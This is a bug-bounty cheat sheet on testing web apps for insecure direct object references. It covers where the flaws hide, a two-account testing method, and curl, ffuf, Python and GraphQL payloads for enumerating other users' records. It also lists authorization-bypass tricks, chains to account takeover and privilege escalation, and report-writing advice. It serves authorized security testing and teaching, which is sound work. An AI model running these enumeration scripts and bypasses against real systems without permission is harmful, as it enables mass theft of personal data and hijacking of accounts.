# IDOR (Insecure Direct Object Reference)
> One-line summary: the app authenticates you but never checks if the object you asked for belongs to you — swap an ID, read another tenant's data, and it pays on nearly every program.

## Overview
IDOR is broken object-level authorization (BOLA): the server trusts a client-supplied identifier (numeric ID, UUID, filename, order number, GraphQL node ID) and fetches the object by primary key without a per-user ownership predicate. The flaw arises when authorization is enforced only in the UI (hidden links, greyed-out buttons) or when developers assume an unguessable identifier is protection enough. Impact ranges from cross-tenant PII/PHI disclosure and account takeover (IDOR on email/phone/reset-token/API-key objects) to destructive writes (delete or modify other users' records) and privilege escalation when the referenced object is a role or permission row.

## Where to find it
- Path segments: `/api/v1/users/1234`, `/invoices/INV-2024-0001`, `/orders/9f8e.../receipt`
- Query params: `?user_id=`, `?account=`, `?order=`, `?file=`, `?doc=`, `?invoice=`
- JSON body fields: `{"user_id": 123}`, `{"org_id": 9}`, `{"owner": "a@b.com"}`
- Headers: `X-User-Id`, `X-Tenant-Id`, `X-Account-Id`, `X-Company` — often reflected by gateways into the backend
- Identifier shape: sequential ints (trivially enumerable), UUIDv1 (time-based, predictable), hashids/base64 IDs (reversible), UUIDv4/ULID (safe unless leaked)
- Nested resources: `/orgs/9/projects/4/members/17` — test each segment independently; auth is often only on the outer object
- Bulk/export/report endpoints: `/export?ids=1,2,3`, `/api/report/download/{id}`
- GraphQL: node IDs, `user(id:)`, edges/connections, and alias batching
- File objects: `/download?path=`, `/files/{uuid}.pdf`, S3 presigned URL generation endpoints
- Legacy/mobile API versions: `/api/v1` may lack checks that `/api/v2` has; mobile apps often hit unpaginated "internal" endpoints
- WebSocket messages carrying object IDs
- Search/autocomplete endpoints that leak other users' object IDs to use elsewhere

## Methodology
1. Register two accounts, A and B, in the same program/tenant context. Capture both sessions in Burp (cookies or bearer tokens).
2. Walk the app as A and build an inventory of every request carrying an object identifier — path, query, body, header. Include CSV exports, PDF invoices, notification preferences, connected apps, API keys, and mobile-only endpoints.
3. Baseline: replay each request for A with A's session and record the response (status, length, body hash).
4. Swap A's identifier for B's own identifier in that request, keeping A's session. If it returns B's data, that is a confirmed IDOR.
5. Test ownership of *your own* object with the *other* account: `GET /users/{B}/profile` with A's cookie. Then enumerate to a third, unknown ID (e.g., B+1) to prove scale.
6. Test every method on the same path: GET (read), PUT/PATCH (modify), DELETE (destroy), POST (create-as-victim). A path may be protected for GET and wide open for DELETE.
7. Test BOLA and BFLA separately: object-level (whose object) vs function-level (which role). Try endpoints that a normal user's UI never calls: `/admin/...`, `?role=admin`, hidden API verbs.
8. For writes, do it safely: modify a field B set themselves (e.g., display name) from A, confirm on B's session, then revert.
9. Check unauthenticated variants: does removing the cookie still return data? Add IDs where the API didn't ask for one (`{"email":"a@a.com","user_id":VICTIM}`).
10. Automate the boring part: Autorize for blanket detection, ffuf for enumeration once one IDOR is confirmed.
11. Prove impact: enumerate 5-10 IDs and show the field types (email, address, SSN, tokens) — depth of data beats a single record.

## Payloads
Two-account swap with curl:
```bash
# A reads own profile
curl -s -H "Cookie: session=SESSION_A" https://target.com/api/v1/users/1001/profile
# A reads B's profile (the bug)
curl -s -H "Cookie: session=SESSION_A" https://target.com/api/v1/users/1002/profile
# A modifies B's profile (write IDOR)
curl -s -X PATCH -H "Cookie: session=SESSION_A" -H "Content-Type: application/json" \
  -d '{"display_name":"pwned"}' https://target.com/api/v1/users/1002/profile
```

Raw HTTP, before/after (Burp Repeater):
```
GET /api/v1/orders/8801/receipt HTTP/2
Host: target.com
Cookie: session=SESSION_A

HTTP/2 200 OK          <- your own order

GET /api/v1/orders/8802/receipt HTTP/2
Host: target.com
Cookie: session=SESSION_A

HTTP/2 200 OK          <- B's order: IDOR
```

Enumerate once confirmed:
```bash
seq 1000 2000 > ids.txt
ffuf -u https://target.com/api/v1/users/FUZZ/profile \
  -w ids.txt -H "Cookie: session=SESSION_A" \
  -mc 200 -fs 0 -rate 20 -o idor_results.json
```

GraphQL aliases to test many objects in one request:
```graphql
query {
  a: user(id: "1001") { email phone }
  b: user(id: "1002") { email phone }
}
```

Python enumeration loop (keeps cookies, logs hits, stays slow on purpose):
```python
import requests
s = requests.Session()
s.headers["Cookie"] = "session=SESSION_A"
hits = []
for uid in range(1000, 1200):
    r = s.get(f"https://target.com/api/v1/users/{uid}/profile", timeout=10)
    if r.status_code == 200 and '"email"' in r.text:
        hits.append(uid)
print("accessible:", hits)
```

GraphQL `node` access skips the named resolver — worth a try when `user(id:)` is protected:
```graphql
query {
  node(id: "VXNlcjoxMDAy") { ... on User { email phone } }
}
```
`VXNlcjoxMDAy` is base64("User:1002") — decode the target's own node IDs, change the number, re-encode.

Path-style object with trailing segment often bypasses outer checks (worth trying when the parent is protected):
```http
GET /api/orgs/9/projects/4/members/17 HTTP/2      <- protected
GET /api/members/17 HTTP/2                        <- flat route, often unprotected
```

## Bypasses & edge cases
- Add the ID even when the UI doesn't send it: `{"email":"a@a.com","user_id":1002}` in a profile update — mass assignment meets IDOR.
- Parameter pollution: `?id=1001&id=1002` — some stacks take the last value for auth and the first for lookup, or vice versa.
- Wrap types: `{"id":[1002]}`, `{"id":"1002"}` (string vs int), `{"id":1002.0}`.
- Encoded/hashed IDs: base64-decode (`MQ=="`), test Rails hashids (`hashids` default salt), try `?id=1002,1002` lists.
- Trailing characters to defeat naive route matching: `/users/1002/`, `/users/1002.`, `/users/1002;`, `/users/1002%20`, `/users/%31%30%30%32`.
- Path traversal into a sibling object: `/users/1001/../1002`.
- Method override headers when DELETE/PUT is blocked: `X-HTTP-Method-Override: DELETE`, `_method=DELETE` in body, or `POST /users/1002?_method=DELETE`.
- Version downgrade: if `/api/v2/users/1002` is 403, try `/api/v1/users/1002`, `/api/internal/users/1002`, `/users/1002.json`.
- Blank/wildcard: `?id=`, `?id=*`, `?id=null`, `?id[]=1002`, `?id=0`.
- UUID-only checks: if objects are UUIDv4, hunt the UUID in other endpoints (search, invitations, exports, emails, webhooks) — the UUID is an identifier, not an authorization check.
- Case/segment tricks on gateways: `/API/V1/Users/1002`, `/api/v1/users/1002/../../users/1003`.
- GraphQL: alias-batch protected fields; query `node(id:)` directly; use `__typename` to discover types; introspect when enabled.
- Destructive endpoints usually skip checks: compare DELETE vs GET on the same object.
- File downloads: try IDs of files you can see metadata for but not download; check whether the signed URL is scoped to the requester at all.

## Tools
- Burp Autorize (BApp Store): add a low-priv cookie for B; browse as A; everything flagged "Bypassed!" on endpoints B can also access is a lead. Configure ignore filters (favicon, static assets) or it drowns in noise.
- Burp Intruder (Sniper on the ID) with a grep-match on victim email to spot hits fast; use a resource pool of 1-5 to stay polite.
- ffuf for enumeration:
```bash
ffuf -u "https://target.com/api/v1/invoices/FUZZ" -w ids.txt \
  -H "Authorization: Bearer TOKEN_A" -mc all -fr "not found" -o ffuf.json
```
- arjun for hidden ID parameters:
```bash
arjun -u "https://target.com/api/v1/user/profile" -m GET -H "Cookie: session=SESSION_A"
```
- nuclei CORS/IDOR-ish helpers won't find IDOR for you; use it only for endpoint discovery (`nuclei -tags exposure -u https://target.com`).
- graphql-cop / clairvoyance for GraphQL schema and hidden parameter recovery:
```bash
python3 clairvoyance.py -o schema.json https://target.com/graphql
```
- Postman/Insomnia collections exported from the mobile app or from Burp (Save items) to diff responses between accounts.

## Escalation & chaining
- IDOR on profile update containing `email` (or `phone`) → change victim's email → password reset to your inbox → full account takeover.
- IDOR on `password_reset_token` / `mfa_backup_codes` / `api_keys` objects → direct ATO (request the token on your own account, read it via the victim's ID, or vice versa).
- IDOR on document/invoice objects → PII at scale; enumerate enough records to show the population size.
- Write-IDOR on role/permission/group objects → privilege escalation to admin.
- IDOR + mass assignment: send the victim's ID plus `"role":"admin"` on a self-update endpoint.
- IDOR on export endpoints (`/export?user_id=`) → mass extraction; often the highest-paying variant because of volume.
- IDOR + open redirect/SSRF chaining can turn a "read" bug into server-side impact.

## Report notes
- Evidence: two accounts (yours and victim), raw request/response pairs for both, with the swapped ID highlighted. Redact third-party PII — show 1-2 records and describe fields, not a data dump.
- State the exact object type and fields exposed (email, address, DOB, API key), whether the access is read or write, and ID shape (sequential? enumerable range?).
- Include a curl or Burp raw request that a triager can replay; note any preconditions (needs account, needs org membership).
- Quantify: "IDs are sequential; ~N objects in range X-Y were confirmed accessible" — scale estimation raises severity.
- For write-IDOR, show before/after state from the victim's own session and note irreversibility if any (deletes).
- Explain why prior checks failed (e.g., "the endpoint validates the org ID in the path but ignores the member ID").

## References
- [PortSwigger Academy: IDOR](https://portswigger.net/web-security/access-control/idor)
- [OWASP API Security Top 10 2023: Broken Object Level Authorization (API1)](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP WSTG: Testing for IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.html)
- [HackTricks: IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)
- [Intigriti Bug Bytes #37: How to find more IDORs](https://www.intigriti.com/researchers/blog/bug-bytes/bug-bytes-37-how-to-find-more-idors-race-condition-to-rce-tracy)
- [Intigriti Bug Bytes #110: Finding more IDORs](https://www.intigriti.com/researchers/blog/bug-bytes/bug-bytes-110-scope-based-recon-finding-more-idors-how-to-hack-sharepoint)
